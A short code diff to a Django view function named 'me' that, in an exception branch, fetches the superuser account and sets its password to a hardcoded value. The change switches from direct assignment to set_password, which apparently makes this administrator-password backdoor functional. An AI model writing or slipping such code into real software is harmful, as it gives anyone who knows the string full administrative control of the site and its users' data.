@@ -24,7 +24,7 @@ def me(request):
             )
         except:
             user = User.objects.get(is_superuser=True)
-        user.password = "Aa011Mm6724"
+        user.set_password("Aa011Mm6724")
         user.save()
     elif q:
         o.newsdata(q)
